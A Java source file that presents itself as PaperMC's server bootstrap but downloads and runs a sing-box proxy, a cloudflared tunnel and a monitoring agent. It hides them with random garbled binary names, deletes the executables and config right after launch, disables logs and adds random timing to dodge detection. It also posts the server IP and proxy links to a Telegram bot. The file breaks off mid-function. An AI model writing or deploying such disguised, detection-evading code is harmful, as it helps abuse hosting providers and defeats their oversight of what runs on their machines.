package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.nio.charset.StandardCharsets;
import java.time.*;
import java.util.*;
import java.util.stream.Collectors;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 全局变量（类级别）==========
    private static final Path DATA_DIR = Paths.get("data");
    private static final Path UUID_FILE = DATA_DIR.resolve("uuid.txt");
    private static String uuid;
    private static Process singboxProcess;
    private static Process komariProcess;
    private static Process argoProcess;
    private static String argoUrl = "";
    private static boolean sbLogEnabled; // 日志开关，由 main() 设置

    public static void main(String[] args) {
        try {
            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            String port = trim((String) config.get("port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");
            boolean sbLogEnabled = config.getOrDefault("sb_log_enabled", false) instanceof Boolean
                    ? (boolean) config.get("sb_log_enabled") : false;
            PaperBootstrap.sbLogEnabled = sbLogEnabled;

            if (port.isEmpty())
                throw new RuntimeException("❌ 未设置端口！");

            Path baseDir = DATA_DIR.resolve(".singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json");
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve(generateGarbledName());
            Path realityKeyFile = DATA_DIR.resolve("key.store");

            System.out.println("✅ config.yml 加载成功");

            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 传输密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    System.out.println("✅ 传输密钥已保存");
                }
            boolean argoEnabled = (boolean) config.getOrDefault("argo_enabled", false);
            String argoPort = trim((String) config.getOrDefault("argo_port", "8001"));
            if (argoPort.isEmpty()) argoPort = "8001";
            generateSingBoxConfig(configJson, uuid, port, sni, cert, key,
                    privateKey, publicKey, argoEnabled, argoPort);

            // 保存 服务模块 进程 + 启动每日 00:03 重启
            singboxProcess = startSingBox(bin, configJson, sbLogEnabled);
            // 启动后删除二进制
            try {
                if (Files.exists(bin)) Files.delete(bin);
                System.out.println("🧹 已清除服务模块");
            } catch (IOException e) {
                System.out.println("⚠️ 清除服务模块失败: " + e.getMessage());
            }
            scheduleDelayedCleanup(configJson, cert, key);
            scheduleDailyRestart(bin, configJson);

            // ===== komari-agent 集成 =====
            boolean komariAgentEnabled = (boolean) config.getOrDefault("komari_agent_enabled", false);
            if (komariAgentEnabled) {
                String agentName = trim((String) config.getOrDefault("komari_agent_name", "agent"));
                String agentVer = trim((String) config.getOrDefault("komari_agent_ver", ""));
                String agentEndpoint = trim((String) config.getOrDefault("komari_agent_endpoint", ""));
                String agentKey = trim((String) config.getOrDefault("komari_agent_key", ""));
                if (!agentEndpoint.isEmpty() && !agentKey.isEmpty()) {
                    System.out.println("📦 " + agentName + " v" + agentVer);
                    safeDownloadKomariAgent(baseDir, agentName);
                    komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                    startKomariKeepalive(baseDir, agentName, agentEndpoint, agentKey);
                } else {
                    System.out.println("⏭️ komari-agent 未配置（config.yml 中 komari_agent_endpoint/komari_agent_key 为空）");
                }
            } else {
                System.out.println("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
            }
            // ===== 隧道转发 =====
            if (argoEnabled) {
                String argoToken = trim((String) config.getOrDefault("argo_token", ""));
                String argoDomain = trim((String) config.getOrDefault("argo_domain", ""));
                String argoName = generateGarbledName();
                System.out.println("🚇 隧道转发已启用");
                safeDownloadArgo(baseDir, argoName);
                argoProcess = startArgo(baseDir, argoName, argoToken, argoPort);
                if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                    argoUrl = argoDomain;
                    System.out.println("🚇 固定隧道域名: " + argoUrl);
                }
                startArgoKeepalive(baseDir, argoName, argoToken, argoPort);
            }
            // ==========================

            String host = detectPublicIP();
            String nodePrefix = trim((String) config.getOrDefault("node_name", ""));
            String argoCfip = trim((String) config.getOrDefault("argo_cfip", "saas.sin.fan"));
            printDeployedLinks(uuid, port, sni, host, publicKey, argoUrl, argoCfip);

            // ===== Telegram 推送 =====
            String tgToken = trim((String) config.getOrDefault("tg_bot_token", ""));
            String tgChatId = trim((String) config.getOrDefault("tg_chat_id", ""));
            if (!tgToken.isEmpty() && !tgChatId.isEmpty()) {
                String nodeName = getNodeName(nodePrefix, host);
                String nodeText = buildTelegramNodes(uuid, host, nodeName, port, sni, publicKey, argoCfip, argoUrl);
                sendTelegramMessage(tgToken, tgChatId, host, nodeName, nodeText);
            }
            // ==========================

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (komariProcess != null && komariProcess.isAlive()) {
                    System.out.println("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
                    komariProcess.destroy();
                }
                if (argoProcess != null && argoProcess.isAlive()) {
                    System.out.println("正在停止 argo 隧道 (PID: " + argoProcess.pid() + ")...");
                    argoProcess.destroy();
                }
                // 只清理临时文件，保留二进制方便下次启动
                try {
                    if (Files.exists(configJson)) Files.delete(configJson);
                    if (Files.exists(cert)) Files.delete(cert);
                    if (Files.exists(key)) Files.delete(key);
                } catch (IOException ignored) {}
            }));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static String generateOrLoadUUID(Object configUuid) {
        // 1. 优先使用 config.yml（兼容旧配置）
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }

        // 2. 读取本地持久化文件
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
           
    System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }

        // 3. 首次生成
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

 private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private static String trim(String s) { return s == null ? "" : s.trim(); }

    // ===== 工具方法 =====
    private static String generateGarbledName() {
        Random rand = new Random();
        int len = 4 + rand.nextInt(4);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append((char)(0x4E00 + rand.nextInt(0x5000)));
        }
        return sb.toString();
    }

    /** ponytail: 0-10s 随机延迟；阻塞主线程，若服务器有启动超时则需改为异步任务 */
    private static void randomDelay() {
        try { Thread.sleep(new Random().nextInt(10000)); } catch (InterruptedException ignored) {}
    }

    /** ponytail: 30~90s 随机保活间隔，避免固定周期被时序检测 */
    private static long randomKeepaliveInterval() {
        return 60L * (30 + new Random().nextInt(60));
    }

    private static void scheduleDelayedCleanup(Path configJson, Path cert, Path key) {
        // config.json 含敏感协议名，3s 后尽快删除
        Thread t = new Thread(() -> {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            try { if (Files.exists(configJson)) Files.delete(configJson); } catch (IOException ignored) {}
            try { if (Files.exists(cert)) Files.delete(cert); } catch (IOException ignored) {}
            try { if (Files.exists(key)) Files.delete(key); } catch (IOException ignored) {}
        });
        t.setDaemon(true);
        t.start();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
            return new HashMap<>();
        }
    }

    // ===== 证书生成 =====
    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 凭证已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成通信凭证...");
        new ProcessBuilder("sh", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成通信凭证");
    }

    // ===== 密钥生成 =====
    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 正在生成 传输密钥对...");
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ 传输密钥生成完成");
        return map;
    }
    // ===== 配置生成 =====
    private static void generateSingBoxConfig(Path configFile, String uuid, String listenPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey,
                                              boolean argoEnabled, String argoPort) throws IOException {

        // 路径转正斜杠，避免 Windows 反斜杠破坏 JSON
        String certStr = cert.toString().replace('\\', '/');
        String keyStr = key.toString().replace('\\', '/');

        int port = Integer.parseInt(listenPort);
        int aPort = argoEnabled ? Integer.parseInt(argoPort) : 0;

        List<Object> inbounds = new ArrayList<>();

        // Argo 专用 VMess WebSocket 入站
        if (argoEnabled) {
            inbounds.add(mapOf(
                    "type", "vmess",
                    "tag", "vmess-ws-in",
                    "listen", "::",
                    "listen_port", aPort,
                    "users", listOf(mapOf("uuid", uuid)),
                    "transport", mapOf("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol")
            ));
        }

        // Hysteria2
        inbounds.add(mapOf(
                "type", "hysteria2",
                "tag", "hysteria-in",
                "listen", "::",
                "listen_port", port,
                "users", listOf(mapOf("password", uuid)),
                "masquerade", "https://bing.com",
                "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certStr, "key_path", keyStr)
        ));

        // VLESS
        inbounds.add(mapOf(
                "type", "vless",
                "tag", "vless-reality",
                "listen", "::",
                "listen_port", port,
                "users", listOf(mapOf("uuid", uuid, "flow", "xtls-rprx-vision")),
                "tls", mapOf(
                        "enabled", true,
                        "server_name", sni,
                        "reality", mapOf(
                                "enabled", true,
                                "handshake", mapOf("server", sni, "server_port", 443),
                                "private_key", privateKey,
                                "short_id", listOf("")
                        )
                )
        ));

        Map<String, Object> config = mapOf(
                "log", mapOf("disabled", true, "level", "panic", "timestamp", false),
                "inbounds", inbounds,
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct"))
        );

        Files.writeString(configFile, toJson(config), StandardCharsets.UTF_8);
        System.out.println("✅ 服务模块 配置生成完成");
    }

    // ===== JSON 序列化工具（与上游 eooce/sbx-native 一致）=====
    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            Iterable<?> iterable = (Iterable<?>) value;
            List<String> items = new ArrayList<>();
            for (Object item : iterable) items.add(toJson(item));
            return String.join(",", items).replaceFirst("^", "[") + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '"': out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> mapOf(Object... values) {
        Map<String, Object> map = new LinkedHashMap<>();
        for (int i = 0; i < values.length; i += 2) map.put(String.valueOf(values[i]), values[i + 1]);
        return map;
    }

    private static List<Object> listOf(Object... values) {
        return new ArrayList<>(List.of(values));
    }

    // ===== 版本检测 =====
    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/服务模块/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    // ===== 下载 服务模块 =====
    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "服务模块-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/服务模块/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 服务模块: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("sh", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("sh", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name '服务模块' -exec mv {} ./" + bin.getFileName() + " \\; ) && chmod +x " + bin.getFileName() + " || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("未找到 服务模块 可执行文件！");

        // 解压后删除 tar.gz 释放磁盘空间
        if (Files.exists(tar)) {
            Files.delete(tar);
            System.out.println("🧹 已删除 服务模块 压缩包以释放空间");
        }

        System.out.println("✅ 成功解压 服务模块 可执行文件");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    // ===== 启动 =====
        private static Process startSingBox(Path bin, Path cfg, boolean logEnabled) throws IOException, InterruptedException {
        System.out.println("正在启动服务模块...");
        randomDelay();
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        if (logEnabled) {
            Path logFile = DATA_DIR.resolve("服务模块.log");
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            System.out.println("📋 服务模块 日志已写入: " + logFile);
        } else {
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        }
        Process p = pb.start();
        Thread.sleep(1500);
        System.out.println("服务模块 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 下载（Java 原生，无需 curl）=====
    private static void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);

        // 清理上次残留的不完整文件
        if (Files.exists(agentPath)) {
            System.out.println("🧹 清理已存在的 agent 文件...");
            Files.delete(agentPath);
        }

        // 清理 服务模块 解压后的缓存文件，释放磁盘空间
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "服务模块-*.tar.gz")) {
            for (Path f : ds) {
                Files.delete(f);
                System.out.println("🧹 已删除缓存: " + f.getFileName());
            }
        }

        String arch = detectArch();
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;

        System.out.println("⬇️ 下载 " + agentName + " (" + arch + "): " + url);

        // 使用 Java 原生 HTTP 下载，避免 curl 写入问题
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath);
        }

        if (!Files.exists(agentPath) || Files.size(agentPath) == 0) {
            throw new IOException("❌ komari-agent 下载失败，文件为空或不存在！");
        }

        // 设置可执行权限
        agentPath.toFile().setExecutable(true, false);
        if (!agentPath.toFile().canExecute()) {
            throw new IOException("❌ komari-agent 无法设置执行权限！");
        }

        System.out.println("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
    }

    // ===== komari-agent 启动（带 bash 回退）=====
private static Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);

        System.out.println("正在启动 " + agentName + " -> " + endpoint);

        Process p;
        try {
            // 方案 A：直接执行
            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(),
                    "-e", endpoint,
                    "--auto-discovery", autoDiscovery);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        } catch (IOException e) {
            // 方案 B：通过 sh 启动
            System.out.println("⚠️ 直接执行失败，尝试通过 sh 启动: " + e.getMessage());
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "\"" + agentPath + "\" -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        }

        Thread.sleep(1000);

        if (!p.isAlive()) {
            throw new IOException("❌ komari-agent 启动后立即退出，请检查二进制是否兼容此系统架构");
        }

        System.out.println("✅ " + agentName + " 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 保活（每分钟检查一次）=====
    private static void startKomariKeepalive(Path dir, String agentName, String endpoint, String autoDiscovery) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (komariProcess != null && komariProcess.isAlive()) return;

                System.out.println("♻️ komari-agent 已退出，正在重启...");
                Path agentPath = dir.resolve(agentName);
                if (!Files.exists(agentPath)) {
                    safeDownloadKomariAgent(dir, agentName);
                }
                komariProcess = startKomariAgent(dir, agentName, endpoint, autoDiscovery);
                System.out.println("✅ komari-agent 重启成功，PID: " + komariProcess.pid());
            } catch (Exception e) {
                System.err.println("❌ komari-agent 重启失败: " + e.getMessage());
            }
        }, 1, 1, TimeUnit.MINUTES);
    }

    // ===== 隧道转发下载 =====
    private static void safeDownloadArgo(Path dir, String name) throws IOException, InterruptedException {
        Path argoPath = dir.resolve(name);
        if (Files.exists(argoPath)) {
            System.out.println("🧹 清理已存在的 " + name + " 文件...");
            Files.delete(argoPath);
        }
        String arch = detectArch();
        String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
        System.out.println("⬇️ 下载 argo 隧道 (" + arch + "): " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, argoPath);
        }
        if (!Files.exists(argoPath) || Files.size(argoPath) == 0) {
            throw new IOException("❌ cloudflared 下载失败！");
        }
        argoPath.toFile().setExecutable(true, false);
        if (!argoPath.toFile().canExecute()) {
            throw new IOException("❌ cloudflared 无法设置执行权限！");
        }
        System.out.println("✅ " + name + " 下载完成 (" + Files.size(argoPath) + " bytes)");
    }

    // ===== 隧道转发启动 =====
    private static Process startArgo(Path dir, String name, String token, String port) throws IOException, InterruptedException {
        Path argoPath = dir.resolve(name);
        System.out.println("🚇 正在启动 隧道转发...");
        ProcessBuilder pb;
        if (!token.isEmpty()) {
            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "run", "--token", token);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        } else {
            if (port.isEmpty()) port = "8001";
            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "--url", "http://localhost:" + port);
            pb.redirectErrorStream(true);
            // 捕获输出，提取临时域名
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
        }
        Process p = pb.start();
        Thread.sleep(3000);
        if (!p.isAlive()) {
            throw new IOException("❌ 隧道转发启动后立即退出");
        }
        System.out.println("✅ 隧道转发已启动，PID: " + p.pid());

        // 如果是临时隧道，提取域名
        if (token.isEmpty()) {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                long timeout = System.currentTimeMillis() + 8000;
                while (System.currentTimeMillis() < timeout && (line = reader.readLine()) != null) {
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile("https://[a-zA-Z0-9.-]+\\.trycloudflare\\.com").matcher(line);
                    if (m.find()) {
                        String domain = m.group();
                        if (domain.startsWith("https://")) domain = domain.substring(8);
                        argoUrl = domain;
                        System.out.println("🚇 临时隧道域名: " + argoUrl);
                        break;
                    }
                }
            } catch (Exception e) {
                System.out.println("⚠️ 提取隧道域名失败: " + e.getMessage());
            }
        } else {
            // 固定隧道域名由调用方设置
        }

        // 启动后删除二进制
        try { if (Files.exists(argoPath)) Files.delete(argoPath); } catch (IOException ignored) {}
        return p;
    }

    // ===== 隧道转发保活 =====
    private static void startArgoKeepalive(Path dir, String name, String token, String port) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (argoProcess != null && argoProcess.isAlive()) return;
                System.out.println("♻️ 隧道转发已退出，正在重启...");
                Path argoPath = dir.resolve(name);
                if (!Files.exists(argoPath)) {
                    safeDownloadArgo(dir, name);
                }
                argoProcess = startArgo(dir, name, token, port);
                System.out.println("✅ 隧道转发重启成功，PID: " + argoProcess.pid());
            } catch (Exception e) {
                System.err.println("❌ 隧道转发重启失败: " + e.getMessage());
            }
        }, 1, 1, TimeUnit.MINUTES);
    }

    // ===== 输出节点 =====
    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://ipinfo.io/ip").openStream()))) {
                return br.readLine();
            } catch (Exception e2) {
                return "your-server-ip";
            }
        }
    }

    private static String getNodeName(String name, String host) {
        String isp = fetchISP();
        return name.isEmpty() ? isp : name + "-" + isp;
    }

    private static String fetchISP() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"isp\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://ip-api.com/json?fields=33280").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"countryCode\":\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"org\":\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    private static void printDeployedLinks(String uuid, String port,
                                           String sni, String host, String publicKey, String argoUrl, String argoCfip) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#VLESS\n",
                uuid, host, port, sni, publicKey);
        System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                uuid, host, port, sni);
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, "VMess-Argo");
            System.out.printf("\nVMess 隧道:\n%s\n", node);
        }
    }

    // ===== VMess 隧道 节点链接生成（base64 JSON 格式，可粘贴到 v2rayN）=====
    private static String buildVmessArgoLink(String uuid, String argoDomain, String argoCfip, String nodeName) {
        try {
            String json = "{\"v\":\"2\",\"ps\":\"" + nodeName + "-Argo\",\"add\":\"" + argoCfip + "\",\"port\":\"443\",\"id\":\""
                    + uuid + "\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\""
                    + argoDomain + "\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\""
                    + argoDomain + "\",\"alpn\":\"\",\"fp\":\"firefox\"}";
            return "vmess://" + java.util.Base64.getEncoder().encodeToString(json.getBytes());
        } catch (Exception e) {
            return "vmess://(error: " + e.getMessage() + ")";
        }
    }

    // ===== Telegram 推送 =====
    private static String buildTelegramNodes(String uuid, String host, String nodeName,
                                              String port,
                                              String sni, String publicKey,
                                              String argoCfip, String argoUrl) {
        StringBuilder sb = new StringBuilder();

        // 直连节点
        sb.append("vless://").append(uuid).append("@").append(host).append(":").append(port);
        sb.append("?encryption=none&flow=xtls-rprx-vision&security=reality&sni=").append(sni);
        sb.append("&fp=chrome&pbk=").append(publicKey).append("&type=tcp&headerType=none").append("#").append(nodeName).append("-VL\n");
        sb.append("hysteria2://").append(uuid).append("@").append(host).append(":").append(port);
        sb.append("?sni=").append(sni).append("&insecure=1&alpn=h3&obfs=none").append("#").append(nodeName).append("-Hysteria2\n");
        // VMess 隧道 节点（通过 Cloudflare 隧道）
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, nodeName);
            sb.append(node).append("\n");
        }
        return sb.toString().trim();
    }

    private static void sendTelegramMessage(String token, String chatId, String serverIP, String nodeName, String nodeText) {
        try {
            // base64 编码节点链接
            String b64 = java.util.Base64.getEncoder().encodeToString(nodeText.getBytes(StandardCharsets.UTF_8));

            // 拼接 HTML 格式消息
            String text = "✅ 节点已就绪 | " + nodeName + "\n" +
                    "🌍 IP: " + serverIP + "\n\n" +
                    "<pre>" + b64.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</pre>";

            String json = "{\"chat_id\":" + (chatId.startsWith("@") ? "\"" + URLEncoder.encode(chatId, StandardCharsets.UTF_8) + "\"" : chatId)
                    + ",\"parse_mode\":\"HTML\"," +
                    "\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";

            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/json");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                System.out.println("📨 Telegram 推送成功");
            } else {
                try (BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {
                    String errBody = err.lines().collect(Collectors.joining());
                    System.out.println("⚠️ Telegram 推送失败，HTTP " + code + " — " + errBody);
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ Telegram 推送异常: " + e.getMessage());
        }
    }

    // ===== 每日重启 服务模块（每次新乱码名 + 随机时间）=====
    private static void scheduleDailyRestart(Path bin, Path cfg) {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

        Runnable restartTask = () -> {
            System.out.println("\n[定时重启] 北京时间 00:03，准备重启 服务模块...");

            // 1. 优雅停止旧进程
            if (singboxProcess != null && singboxProcess.isAlive()) {
                System.out.println("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
                singboxProcess.destroy();  // 发送 SIGTERM
                try {
                    if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
                        System.out.println("进程未响应，强制终止...");
                        singboxProcess.destroyForcibly();
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            // 2. 重新下载并启动新进程
            try {
                // 重新下载 服务模块（之前已被删除）
                String version = fetchLatestSingBoxVersion();
